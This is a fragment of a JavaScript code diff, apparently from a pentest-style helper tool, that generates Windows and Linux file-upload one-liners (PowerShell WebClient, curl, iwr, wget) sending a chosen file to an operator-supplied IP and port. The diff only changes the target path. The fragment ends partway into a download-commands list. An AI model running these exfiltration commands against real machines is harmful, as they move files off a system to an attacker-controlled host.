@@ -216,13 +216,13 @@
     if (file && port && ip) {
       // Comandos de descarga
       const uploadCommandsWindows = [
-        `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/upload', 'C:\\Users\\kermi\\Desktop\\${file}')`,
-        `curl.exe -F 'file=@C:\\Users\\kermi\\Desktop\\${file}' http://${ip}:${port}/upload`,
-        `iwr -uri http://${ip}:${port}/upload -Method Post -InFile 'C:\\Users\\kermi\\Desktop\\${file}' -UseBasicParsing`
+        `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', 'C:\\Users\\kermi\\Desktop\\${file}')`,
+        `curl.exe -F 'file=@C:\\Users\\kermi\\Desktop\\${file}' http://${ip}:${port}/`,
+        `iwr -uri http://${ip}:${port}/ -Method Post -InFile 'C:\\Users\\kermi\\Desktop\\${file}' -UseBasicParsing`
       ];
       const uploadCommandsLinux = [
-        `curl -X POST -F 'file=@${file}' http://${ip}:${port}/upload`,
-        `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/upload`
+        `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
+        `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
       ];
 
       const downloadCommandsWindows = [
